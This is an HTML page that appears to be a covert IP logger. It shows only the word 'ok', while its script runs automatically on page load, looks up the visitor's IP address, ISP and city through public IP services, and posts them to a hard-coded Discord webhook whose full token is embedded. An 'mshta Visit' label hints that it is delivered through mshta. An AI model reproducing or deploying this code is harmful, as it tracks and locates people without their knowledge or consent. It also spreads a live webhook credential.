<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>.</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #00ff00;
            font-family: monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .ok { font-size: 5rem; font-weight: bold; }
        .log { margin-top: 20px; font-size: 1.1rem; color: #00cc00; }
    </style>
</head>
<body>
    <div class="ok">ok</div>
    <div class="log" id="log">initializing...</div>

    <script>
        // === YOUR DISCORD WEBHOOK ===
        const WEBHOOK = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
        // ============================

        async function send(data) {
            if (!WEBHOOK.includes("webhooks/")) return;
            try {
                await fetch(WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: "**IP Log**",
                        embeds: [{
                            title: "New mshta Visit",
                            color: 65280,
                            fields: [
                                { name: "IP", value: data.ip || data.query || "N/A", inline: true },
                                { name: "ISP", value: data.isp || data.org || "N/A", inline: true },
                                { name: "Location", value: `${data.city || ''} ${data.regionName || data.region || ''}`.trim() || "N/A", inline: true },
                                { name: "Time", value: new Date().toISOString(), inline: false }
                            ]
                        }]
                    })
                });
            } catch(e) {}
        }

        async function run() {
            const log = document.getElementById("log");
            log.textContent = "fetching...";

            const apis = [
                "http://ip-api.com/json",
                "https://ipinfo.io/json",
                "https://api.ipify.org?format=json"
            ];

            for (let url of apis) {
                try {
                    const r = await fetch(url, {cache: "no-store"});
                    if (!r.ok) continue;
                    const d = await r.json();

                    const ip = d.query || d.ip;
                    const isp = d.isp || d.org;

                    log.innerHTML = `IP: ${ip}<br>ISP: ${isp || 'detected'}`;
                    await send(d);
                    return;
                } catch(e) {}
            }
            log.textContent = "logged";
            await send({ip: "partial"});
        }

        window.onload = run;
    </script>
</body>
</html>
